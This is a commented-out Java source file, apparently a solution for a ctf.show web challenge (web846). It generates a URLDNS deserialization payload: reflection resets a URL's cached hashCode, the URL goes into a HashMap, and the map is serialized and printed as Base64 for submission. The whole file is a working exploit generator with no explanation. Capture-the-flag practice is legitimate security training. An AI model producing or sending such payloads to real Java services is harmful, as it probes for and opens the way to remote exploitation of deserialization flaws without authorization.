//package org.example;
//
//import java.io.*;
//import java.lang.reflect.Field;
//import java.net.URL;
//import java.nio.file.Files;
//import java.nio.file.Paths;
//import java.util.Base64;
//import java.util.HashMap;
//
//public class web846URLDNS_payload {
//    public static void main(String[] args) throws Exception {
//        URL url = new URL("https://2405f70f-df68-4a1c-9eac-3df22312e4ee.challenge.ctf.show/");
//        HashMap map = new HashMap();
//        Field hashcode = url.getClass().getDeclaredField("hashCode");
//        hashcode.setAccessible(true);
//        hashcode.set(url, 1);
//        map.put(url,"godown");
//        hashcode.set(url,-1);
//        serialize(map);
//        System.out.println(encodeToBase64(Files.readAllBytes(Paths.get("ser.bin"))));
////        unserialize("ser.bin");
//    }
//    public static String encodeToBase64(byte[] data) {
//        return Base64.getEncoder().encodeToString(data);
//    }
//    public static void serialize(Object obj) throws Exception
//    {
//        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
//        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
//        oos.writeObject(obj);
//        oos.close();
//    }
//    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
//    {
//        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
//        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
//        Object obj = ois.readObject();
//        ois.close();
//        return obj;
//    }
//}